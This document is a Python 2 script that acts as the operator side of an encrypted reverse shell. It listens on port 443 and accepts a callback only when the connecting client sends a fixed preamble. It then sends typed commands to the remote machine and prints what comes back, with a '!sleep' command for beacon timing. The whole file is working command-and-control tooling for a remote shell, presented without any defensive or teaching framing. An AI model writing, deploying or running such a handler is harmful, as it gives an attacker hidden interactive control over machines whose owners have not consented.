#!/usr/bin/env python
from __future__ import print_function
import socket
import ssl
import struct
# to get cert use
# cert = ssl_sock.getpeercert(binary_form=True)
# print(hashlib.sha1(cert).hexdigest())
PORT = 443
HOST = 'localhost'
PREAMBLE = '1010101010101010101010101010101010101010101010101010101010101011'


def check_sleep(command):
    command = command.split()
    if len(command) == 2:
        pass
    else:
        return False
    try:
        int(command[1])
        pass
    except ValueError:
        return False
    return True


def shell(conn_stream):
    while True:
        command = raw_input('> ')
        if command == '!exit':
            return False
        elif command == '':
            continue  # Handle eof error
        elif command.startswith('!sleep'):
            if check_sleep(command) is False:
                print("Invalid sleep format: !sleep <int_minutes>")
                continue
            else:
                print("Shell sleeping for {} minutes...".format(command.split()[1]))
                conn_stream.write(command)
                return False
        else:
            conn_stream.write(command)
            data_length = conn_stream.read(4)
            if data_length is None or len(data_length) != 4:
                return False
            msg_length = struct.unpack('>I', data_length)[0]
            data = ''
            while len(data) < msg_length:
                data += conn_stream.read((msg_length - len(data)))
                if data is None:
                    return True
            print("\n{}".format(data))


def bind_listener():
    print("Listening on - {}:{}".format(HOST, PORT))
    handler_sock = socket.socket()
    handler_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    handler_sock.bind((HOST, PORT))
    handler_sock.listen(5)
    return handler_sock


def get_connection(handler_sock):
    print("\nWaiting for connections... ")
    new_socket, src_addr = handler_sock.accept()
    print("Connection received from: {}".format(src_addr))
    conn_stream = ssl.wrap_socket(new_socket,
                                  server_side=True,
                                  certfile='server.crt',
                                  keyfile='server.key')
    return conn_stream, src_addr


def shutdown_connection(conn_stream):
    if conn_stream is None:
        pass
    else:
        conn_stream.shutdown(socket.SHUT_RDWR)
        conn_stream.close()


def main():
    handle_up = True
    handler_sock = bind_listener()
    while handle_up is True:
        conn_stream, src_addr = get_connection(handler_sock)
        try:
            check_data = conn_stream.read()
            if check_data == PREAMBLE:
                handle_up = shell(conn_stream)
        finally:
            try:
                shutdown_connection(conn_stream)
                print("Connection closed from: {}".format(src_addr))
            except socket.error as e:
                print(e)
    print("\nHandler shut down...")


if __name__ == "__main__":
    main()